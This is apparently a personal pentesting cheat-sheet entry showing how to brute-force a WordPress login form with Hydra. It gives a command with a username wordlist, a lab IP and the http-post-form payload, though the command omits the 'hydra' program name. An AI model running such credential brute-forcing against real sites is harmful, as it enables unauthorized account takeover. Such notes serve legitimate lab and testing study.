# Hydra


## Bruteforce HTTP Form

To bruteforce a Login catch the request with burpsuite and for a hydra command.

Command:
```console
root@machine:~$ -vV -L fsocity.dic.uniq -p wedontcare 192.168.2.4 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'

Options:
    -vV     verbose mode
    -L      use wordlist for Username
    -p      use given password
    -http-post-form     request type

Payload:
    '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
```

`^USER^` & ``^PASS^`` are used as placeholder. ``"F=Invalid username"`` is the string for the error message.

---
